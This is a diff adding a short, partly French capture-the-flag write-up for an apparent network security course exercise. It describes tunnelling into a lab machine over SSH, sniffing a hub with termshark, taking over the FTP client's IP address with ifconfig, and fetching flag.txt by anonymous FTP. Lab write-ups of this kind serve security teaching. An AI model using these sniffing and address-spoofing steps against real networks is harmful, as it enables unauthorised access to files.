@@ -1,0 +1,25 @@
+You have gained access to an attacker machine in the target network! Note that:
+
+Interface eth0 is connected to the Firewall through which you are penetrating.
+Interface eth1 is connected to a hub.
+An FTP client and server are also connected to the hub.
+BUT the client is not retrieving what you want...
+AND the FTP server will not let you in directly...
+To do a simple FTP anonymous client request you can use wget ftp://anonymous@someip/.
+
+==========================
+
+ssh -i ~/.ssh/id_rsa_tunnelctf -l tunneluser -N -L 4001:10.107.1.21:22 35.233.20.31
+ssh -p 4001 root@127.0.0.1
+
+termshark -i eth1
+Noter les ip du client : ipc et du serveur : ips
+ifconfig eth1 ipc 
+wget ftp://anonymous@ips/
+scp -P 4001 root@127.0.0.1:./index.html ./Documents/ITR302cybersecurite/challenges_reseau
+
+On obtient un fichier index.html
+Dedans je vois l'adresse du fichier qui m'intéresse, flag.txt
+Je refais une requête : 
+wget ftp://anonymous@ips/flag.txt
+scp -P 4001 root@127.0.0.1:./flag.txt ./Documents/ITR302cybersecurite/challenges_reseau
